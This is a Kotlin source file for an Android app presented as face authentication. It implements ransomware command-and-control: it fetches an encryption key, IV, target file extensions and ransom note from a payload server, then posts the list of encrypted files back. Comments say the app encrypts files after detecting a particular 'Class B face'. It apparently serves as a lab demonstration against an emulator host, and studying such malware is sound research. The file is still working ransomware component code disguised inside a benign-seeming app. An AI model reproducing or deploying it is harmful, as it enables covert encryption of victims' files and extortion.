package com.faceauth.app.security

import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * Fetches the encryption payload from the remote payload server at runtime.
 *
 * The Android APK contains ZERO encryption keys, ZERO file targets, and
 * ZERO ransom note text.  All of these arrive via this HTTP call.
 * Without a reachable payload server the encryption code is completely inert.
 *
 * This models real ransomware C2 architecture:
 *   1. APK is installed (contains only algorithm, no key)
 *   2. Trigger condition met (Class B face detected)
 *   3. App calls home to C2 server → receives key + parameters
 *   4. Encryption proceeds using the fetched key
 *
 * Payload server: payload_server.py running on the host machine.
 * Android emulator reaches host via the special alias 10.0.2.2.
 */
object PayloadFetcher {

    private const val TAG            = "PayloadFetcher"
    private const val SERVER_HOST    = "10.0.2.2"    // emulator → host machine
    private const val SERVER_PORT    = 8888
    private const val PAYLOAD_PATH   = "/payload"
    private const val REPORT_PATH    = "/report"
    private const val TIMEOUT_MS     = 8_000

    data class EncryptionPayload(
        val algorithm:        String,
        val keyB64:           String,
        val ivB64:            String,
        val targetExtensions: List<String>,
        val ransomNote:       String,
        val serverTimestamp:  String,
        val sessionId:        String
    )

    sealed class FetchResult {
        data class Success(val payload: EncryptionPayload) : FetchResult()
        data class Failure(val reason: String)             : FetchResult()
    }

    /**
     * Fetches the encryption payload from the payload server.
     * Must be called from a background thread / coroutine.
     *
     * @return FetchResult.Success with the payload, or FetchResult.Failure
     *         with a human-readable reason.
     */
    fun fetchPayload(): FetchResult {
        val url = "http://$SERVER_HOST:$SERVER_PORT$PAYLOAD_PATH"
        Log.i(TAG, "Contacting payload server: $url")

        return try {
            val conn = (URL(url).openConnection() as HttpURLConnection).apply {
                requestMethod     = "GET"
                connectTimeout    = TIMEOUT_MS
                readTimeout       = TIMEOUT_MS
                setRequestProperty("Accept",     "application/json")
                setRequestProperty("User-Agent", "FaceAuthSecurityClient/1.0")
            }

            val code = conn.responseCode
            Log.d(TAG, "Server responded with HTTP $code")

            if (code != 200) {
                return FetchResult.Failure("Server returned HTTP $code")
            }

            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()

            Log.d(TAG, "Payload received (${body.length} bytes)")
            val json = JSONObject(body)

            val payload = EncryptionPayload(
                algorithm        = json.getString("algorithm"),
                keyB64           = json.getString("key_b64"),
                ivB64            = json.getString("iv_b64"),
                targetExtensions = buildList {
                    val arr = json.getJSONArray("target_extensions")
                    repeat(arr.length()) { add(arr.getString(it)) }
                },
                ransomNote       = json.getString("ransom_note"),
                serverTimestamp  = json.optString("server_timestamp", ""),
                sessionId        = json.optString("session_id", "")
            )

            Log.i(TAG, "Payload parsed: algo=${payload.algorithm}  " +
                       "key=${payload.keyB64.take(8)}...  " +
                       "targets=${payload.targetExtensions}")

            FetchResult.Success(payload)

        } catch (e: java.net.ConnectException) {
            val msg = "Cannot reach payload server at $SERVER_HOST:$SERVER_PORT. " +
                      "Is payload_server.py running?"
            Log.e(TAG, msg, e)
            FetchResult.Failure(msg)
        } catch (e: java.net.SocketTimeoutException) {
            val msg = "Payload server timed out after ${TIMEOUT_MS}ms"
            Log.e(TAG, msg, e)
            FetchResult.Failure(msg)
        } catch (e: Exception) {
            val msg = "Unexpected error fetching payload: ${e.message}"
            Log.e(TAG, msg, e)
            FetchResult.Failure(msg)
        }
    }

    /**
     * Reports the list of encrypted files back to the payload server.
     * The server logs these for demonstration purposes.
     * This models ransomware "check-in" behaviour.
     */
    fun reportEncryptedFiles(filePaths: List<String>) {
        val url = "http://$SERVER_HOST:$SERVER_PORT$REPORT_PATH"
        try {
            val body = JSONObject().apply {
                put("encrypted_files", org.json.JSONArray(filePaths))
                put("timestamp", System.currentTimeMillis())
            }.toString().toByteArray()

            val conn = (URL(url).openConnection() as HttpURLConnection).apply {
                requestMethod     = "POST"
                connectTimeout    = TIMEOUT_MS
                readTimeout       = TIMEOUT_MS
                doOutput          = true
                setRequestProperty("Content-Type",   "application/json")
                setRequestProperty("Content-Length", body.size.toString())
            }
            conn.outputStream.use { it.write(body) }
            val code = conn.responseCode
            conn.disconnect()
            Log.i(TAG, "File report sent → HTTP $code  (${filePaths.size} files)")
        } catch (e: Exception) {
            Log.w(TAG, "Could not report files: ${e.message}")
        }
    }
}
